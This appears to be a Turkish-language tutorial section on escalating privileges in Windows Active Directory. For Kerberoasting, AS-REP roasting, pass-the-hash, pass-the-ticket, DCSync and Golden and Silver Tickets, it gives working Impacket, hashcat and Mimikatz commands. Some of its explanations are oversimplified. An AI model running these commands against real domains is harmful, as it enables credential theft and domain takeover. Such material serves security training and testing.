**Windows Privilege Escalation: Active Directory Abuse (Active Directory’nin Kötüye Kullanılması)**

Active Directory (AD), büyük organizasyonların kullanıcı ve kaynak yönetimi için kullandığı bir dizin hizmetidir. Yanlış yapılandırmalar, zayıf şifreleme yöntemleri ve güvenlik açıkları, saldırganların AD ortamında ayrıcalıklarını yükseltmesine olanak tanır. Aşağıda, yaygın Active Directory saldırıları ve privilege escalation yöntemleri detaylı bir şekilde açıklanmıştır:

---

### **6.1. Kerberoasting**

Kerberoasting, Active Directory ortamında kullanıcıların servis hesaplarının şifre hash'lerini Kerberos protokolü üzerinden alarak brute-force veya offline saldırılarla çözmeyi hedefler.

#### **Nasıl Çalışır?**
1. AD'de, hizmet hesapları genellikle SPN (Service Principal Name) ile ilişkilidir.
2. SPN'lere bağlı olan TGS (Ticket Granting Service) biletleri, saldırgan tarafından elde edilebilir ve hash'leri kırılarak şifreler elde edilebilir.

#### **Tespit**
- Kullanılabilir SPN'leri listelemek için:
  ```cmd
  setspn -T domain.com -Q */*
  ```

#### **Kötüye Kullanma**
1. **Impacket** kullanarak TGS hash'lerini alın:
   ```cmd
   GetUserSPNs.py domain/user -outputfile tgs_hashes.txt
   ```
2. **hashcat** ile hash'leri brute-force yapın:
   ```bash
   hashcat -m 13100 tgs_hashes.txt wordlist.txt
   ```

---

### **6.2. ASREPRoasting**

ASREPRoasting, Kerberos'un AS-REP isteğinden faydalanır. Kerberos preauthentication özelliği devre dışı bırakılmış kullanıcılar hedef alınır.

#### **Nasıl Çalışır?**
1. Preauthentication devre dışı ise, saldırgan AS-REP yanıtını alarak kullanıcı hash'ini kırabilir.

#### **Tespit**
- Preauthentication devre dışı olan kullanıcıları bulmak için:
  ```powershell
  Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object { $_.DoesNotRequirePreAuth -eq $true }
  ```

#### **Kötüye Kullanma**
1. **Impacket** kullanarak AS-REP yanıtını alın:
   ```cmd
   GetNPUsers.py -dc-ip [DC_IP] domain.com/username
   ```
2. Elde edilen hash'leri kırın:
   ```bash
   hashcat -m 18200 hash.txt wordlist.txt
   ```

---

### **6.3. Abusing Group Policy Objects (GPO) Permissions**

GPO'lar, Active Directory'deki kullanıcı ve bilgisayarların yapılandırılmasını sağlar. Zayıf izinlere sahip GPO'lar, kötü niyetli yapılandırmalar için kullanılabilir.

#### **Tespit**
- GPO izinlerini kontrol etmek için:
  ```powershell
  Get-GPPermissions -All | Where-Object { $_.Permission -match "Write" }
  ```

#### **Kötüye Kullanma**
1. Yazılabilir bir GPO bulun.
2. GPO içine zararlı bir script ekleyin.
3. GPO uygulandığında script çalıştırılır ve SYSTEM yetkisi kazanılır.

---

### **6.4. Pass-the-Hash (PtH) Saldırıları**

Kullanıcı parolasını bilmeden NTLM hash'i kullanarak kimlik doğrulama yapılmasını sağlar.

#### **Nasıl Çalışır?**
- Elde edilen NTLM hash'leri, hedef makinelere kimlik doğrulama için kullanılabilir.

#### **Tespit**
- Hedef makinelerde açık portları ve hizmetleri kontrol edin.
  ```cmd
  nmap -p445 [target-ip]
  ```

#### **Kötüye Kullanma**
1. **Mimikatz** veya benzeri araçlarla hash'i alın:
   ```cmd
   sekurlsa::logonpasswords
   ```
2. Pass-the-Hash için:
   ```cmd
   psexec.py domain/user@target -hashes :[NTLM_hash]
   ```

---

### **6.5. Pass-the-Ticket (PtT) Saldırıları**

Kerberos biletlerinin yeniden kullanılmasıyla yapılan bir saldırıdır. Kullanıcı şifresine ihtiyaç duyulmadan TGT (Ticket Granting Ticket) ile kimlik doğrulama yapılır.

#### **Tespit**
- Geçerli Kerberos biletlerini kontrol etmek için:
  ```cmd
  klist
  ```

#### **Kötüye Kullanma**
1. **Mimikatz** ile TGT alın:
   ```cmd
   kerberos::list /export
   ```
2. TGT'yi başka bir oturumda yükleyerek kullanın:
   ```cmd
   kerberos::ptt ticket.kirbi
   ```

---

### **6.6. LDAP Enumeration ve Zayıf ACL’lerin Kullanılması**

LDAP (Lightweight Directory Access Protocol), AD'deki kullanıcılar, gruplar ve izinler hakkında bilgi almak için kullanılabilir.

#### **Tespit**
- LDAP ile domain bilgilerini enumerate etmek için:
   ```cmd
   ldapsearch -H ldap://[DC_IP] -x -b "dc=domain,dc=com"
   ```

#### **Kötüye Kullanma**
1. Zayıf ACL'lere sahip kullanıcıları veya grupları bulun.
2. Bu izinleri kullanarak kullanıcı gruplarını manipüle edin veya yeni kullanıcılar ekleyin.

---

### **6.7. Golden Ticket Saldırısı**

Golden Ticket saldırısı, Kerberos TGT'lerinin sahte bir Kerberos Key Distribution Center (KRBTGT) kullanılarak oluşturulmasıdır. Bu, bir saldırganın domain controller üzerinde kalıcı erişim elde etmesine olanak tanır.

#### **Kötüye Kullanma**
1. **Mimikatz** ile KRBTGT hash alın:
   ```cmd
   lsadump::dcsync /domain:domain.com /user:krbtgt
   ```
2. Golden Ticket oluşturun:
   ```cmd
   kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21... /krbtgt:[hash] /id:500
   ```

---

### **6.8. Silver Ticket Saldırısı**

Silver Ticket saldırısında, yalnızca belirli bir hizmet için TGS oluşturulur. Bu, daha az fark edilir ve hedefli saldırılarda kullanılır.

#### **Kötüye Kullanma**
1. TGS hash'ini alın.
2. Silver Ticket oluşturun ve kullanın:
   ```cmd
   kerberos::silver /service:cifs /target:server.domain.com /user:Administrator /rc4:[hash]
   ```

---

### **6.9. AdminSDHolder Abuse**

Active Directory'deki AdminSDHolder nesnesi, kritik gruplar ve kullanıcılar için izinleri belirler. Yanlış yapılandırıldığında, saldırganlar kendilerini Domain Admins grubuna ekleyebilir.

#### **Kötüye Kullanma**
1. AdminSDHolder izinlerini kontrol edin.
2. Kullanıcı hesabınızı AdminSDHolder'a ekleyin.

---

### **6.10. Tools for Active Directory Abuse**

- **BloodHound:** AD ilişkilerini ve zayıflıkları görselleştirmek için.
- **Impacket:** Kerberos saldırıları için çeşitli araçlar içerir.
- **PowerView:** Active Directory enumeration ve saldırıları için PowerShell modülü.
- **Mimikatz:** Kerberos biletleri ve hash çıkarımı için.

---
